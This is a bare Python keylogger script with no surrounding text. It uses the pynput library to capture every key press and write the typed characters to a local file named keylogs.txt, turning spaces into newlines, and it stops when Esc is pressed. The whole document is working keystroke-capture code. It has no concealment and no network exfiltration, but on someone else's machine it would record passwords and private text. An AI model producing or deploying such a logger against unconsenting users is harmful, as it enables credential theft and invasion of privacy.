from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    keys.append(key)
    write_to_file(keys)

def write_to_file(keys):
    with open("keylogs.txt", "w") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
